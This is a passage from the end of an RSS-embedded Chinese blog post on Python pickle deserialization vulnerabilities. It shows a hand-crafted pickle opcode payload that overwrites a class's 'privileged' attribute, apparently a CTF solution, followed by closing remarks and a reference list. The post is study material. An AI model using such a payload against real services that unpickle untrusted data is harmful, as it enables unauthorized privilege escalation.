&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#34;cstructs\nUser\np0\n0g0\n(}(S&amp;#39;__set__&amp;#39;\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S&amp;#39;privileged&amp;#39;\ng2\ndtbg2\n.&amp;#34;
&lt;/code>&lt;/pre>&lt;/details>
&lt;p>考虑到这个题更综合了python的相关特性，所以把这个题放在最后。&lt;/p>
&lt;hr>
&lt;p>从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。&lt;/p>
&lt;p>自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT&lt;/p>
&lt;hr>
&lt;p>最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/wjrblogs/p/14057784.html">Python 反序列化漏洞学习笔记&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你理解漏洞之 Python 反序列化漏洞&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickle反序列化初探&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188981#h2-10">Python pickle 反序列化实例分析&lt;/a> | &lt;a href="https://segmentfault.com/a/1190000013099825">Python 反序列化安全问题（一）&lt;/a> - &lt;a href="https://segmentfault.com/a/1190000013214956">Python 反序列化安全问题（二）&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp;amp; 不用reduce的RCE姿势&lt;/a> | &lt;a href="https://blog.csdn.net/weixin_39929635/article/details/111003485">关于Python sec的一些简单的总结&lt;/a> | &lt;a href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles A serialised exploitation guide in one part - Macro Slaviero&lt;/a> | &lt;a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#">🐍 Security Issues in Python Pickle&lt;/a>&lt;/p></description></item></channel></rss>